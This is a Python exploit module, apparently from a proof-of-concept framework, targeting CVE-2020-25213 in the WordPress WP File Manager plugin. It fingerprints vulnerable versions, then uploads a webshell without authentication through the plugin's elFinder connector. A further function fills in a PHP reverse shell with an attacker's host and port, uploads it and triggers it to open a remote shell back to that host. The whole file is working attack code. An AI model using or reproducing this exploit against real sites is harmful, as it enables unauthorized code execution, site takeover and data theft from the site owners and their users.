import requests 
import sys
import os
import re
from Framework.Library.Function.Function.PocSuite.api import paths

class elFinder: 
    def __init__(self, url): 
        self.url = url
    def check_version(self):
        try: 
            resp = requests.get(self.url + '/wp-content/plugins/wp-file-manager/readme.txt')
            

            if resp.status_code != 200:
                return False
            fixed_version = 6.9
            items = re.findall("Stable tag.*$", resp.text, re.MULTILINE)
            for x in items: 
                if(float)(x.split(": ")[1]) < fixed_version: 
                    return True
                else: 
                    return False
        except: 
            return False
    def check(self): 
        check = self.check_version()
        if check: 
            flag = "\{\"error\":\[\"errUnknownCmd\"\]\}"
            r = requests.get(self.url +'/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php')
            if re.search(flag, r.text): 
                return True
            else: 
                return False
    
    def exploit(self): 
        check = self.check_version()
        filename = os.path.join(paths.POCSUITE_ROOT_PATH, "init_pocs/cve_2020_25213/simple_webshell.php")
        if check: 
            data = {
                    'cmd': 'upload', 
                    'target': 'l1_', 
                    'debug': 1
                }
            files = {
                'upload[0]': open(filename, 'rb')
            }
            vul_url = self.url +  "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
            r1 = requests.post(vul_url, data=data, files=files, verify=False) 
            r = requests.get( self.url + '/wp-content/plugins/wp-file-manager/lib/files/simple_webshell.php')
            if r.status_code == 200 and "shell is available" in r.text: 
                return True
            else: 
                return False


def verify(url): 
    result = elFinder(url)
    return result.check()

def exploit(url): 
    result = elFinder(url)
    return result.exploit()
def rce(url, lhost, lport): 
    url = url.split("wp-content")[0]
    with open(paths.POCSUITE_ROOT_PATH+ "/init_pocs/cve_2020_25213/php-reverse-shell-source.php", "rb") as file: 
        shell = file.read().decode()
        file.close()
    shell = shell.replace("LHOST_cve_2020_25213", lhost)
    shell = shell.replace("LPORT_cve_2020_25213", lport)
    with open(paths.POCSUITE_ROOT_PATH+ "/init_pocs/cve_2020_25213/php-reverse-shell.php", "wb") as file:
        file.write(str.encode(shell))
        file.close()
    data = {
            'cmd': 'upload', 
            'target': 'l1_', 
            'debug': 1
    }
    files = {
            'upload[0]': open(paths.POCSUITE_ROOT_PATH+ "/init_pocs/cve_2020_25213/php-reverse-shell.php",'rb')
    }
    vul_url = url + "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
    requests.post(vul_url, data=data, files=files, verify=False) 
    print("upload shell thanh cong")
    requests.get(url + "/wp-content/plugins/wp-file-manager/lib/files/php-reverse-shell.php", timeout=5)


    
    
                
